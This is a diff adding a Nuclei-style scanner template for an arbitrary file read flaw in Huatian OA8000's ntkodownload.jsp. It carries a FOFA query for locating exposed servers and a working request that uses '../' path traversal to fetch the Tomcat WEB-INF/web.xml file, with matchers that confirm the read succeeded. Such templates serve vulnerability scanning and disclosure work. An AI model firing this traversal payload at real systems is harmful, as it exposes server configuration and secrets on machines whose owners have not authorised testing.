@@ -1,0 +1,27 @@
+id: huatian-oa8000-ntkodownload-lfi
+
+info:
+  name: 华天动力OA8000 ntkodownload.jsp 任意文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    ntkodownload.jsp接口存在路径遍历漏洞，可读取服务器任意文件
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+  tags: 华天动力OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<web-app"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
